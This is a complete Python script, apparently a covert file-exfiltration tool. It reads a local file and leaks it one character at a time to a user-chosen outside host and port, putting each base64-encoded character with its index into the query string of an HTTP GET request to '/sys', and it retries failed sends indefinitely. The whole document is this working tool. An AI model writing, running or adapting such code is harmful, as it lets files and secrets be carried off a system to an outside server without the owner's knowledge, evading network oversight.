#!/usr/bin/python
############################################################

import urllib2
from scapy.all import *
from termcolor import colored
import base64
import datetime
import argparse
import os

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-f','--read-file', action='store', required=True, dest='read_file',help='[Required] File to send by HTTP Get.')
parser.add_argument('-t','--target-address', action='store', required=True, dest='target',help='[Required] Destination Address .')
parser.add_argument('-p','--target-port', action='store', required=True, dest='port',help='[Required] Destination Port.')
args = parser.parse_args()

# Configuration
file_to_tranfer = str(args.read_file)
http_server = str(args.target)
http_server_port = int(args.port)

# Header
print ('###[ HTTP GET Transfer ]###')
print ('###[ Version 0.2 ]###')
print ('###[ Date 22/04/2020 ]###')
print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
print ('')

def log_timestamp():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def convert_bytes(num):
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if num < 1024.0:
            return "%3.1f %s" % (num, x)
        num /= 1024.0

def file_size(file):
    if os.path.isfile(file):
        file_info = os.stat(file)
        return convert_bytes(file_info.st_size)

def do_get(a):
    try:
        return urllib2.urlopen(a)
    except:
        time.sleep(1)
        do_get(a)

file = open(file_to_tranfer, "r", buffering=-1)
file_data = file.read()
file.close()

print ('###[ '+ log_timestamp() + ' File to Transfer: ' + file_to_tranfer + ' ]###')
print ('###[ '+ log_timestamp() + ' File Size: ' + file_size(file_to_tranfer) + ' ]###')
print ('###[ '+ log_timestamp() + ' File Characters: ' + str(len(str(file_data))) + ' ]###')
print ('')

file_characters = len(str(file_data))

i = 0

for c in file_data:
    i = i + 1
    index = str(i) + '/' + str(len(file_data))
    index_c = c + '&&' + index
    raw=index_c.encode('base64')
    url_get = 'http://' + http_server + ':' + str(http_server_port) + '/sys?p=' + str(raw)
    print ('###[ '+ log_timestamp() + ' Transfering: ' + colored(index,'green') + ' Get > ' + colored(str(url_get).rstrip('\n'),'red') + ' ]###')
    do_get(url_get)